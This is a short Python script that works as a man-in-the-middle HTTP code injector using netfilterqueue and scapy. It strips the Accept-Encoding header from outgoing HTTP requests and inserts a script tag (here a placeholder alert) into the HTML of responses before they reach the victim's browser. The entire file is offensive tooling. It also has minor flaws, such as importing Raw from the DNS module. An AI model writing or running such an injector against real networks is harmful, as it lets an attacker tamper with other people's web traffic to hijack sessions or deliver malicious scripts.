#!/usr/bin/env python3
# Rebuild - uncommented
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""

def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                print("[+] This is a HTTP Request:  ")
                modified_load = re.sub(
                    "Accept-Encoding:.*?\\r\\n",
                    "",
                    scapy_packet[Raw].load,
                    flags=re.IGNORECASE | re.MULTILINE
                )
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(str(new_packet))
            elif scapy_packet[TCP].sport == 80:
                modified_load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Test!'); </script></body>")
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(str(new_packet))
    packet.accept()

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
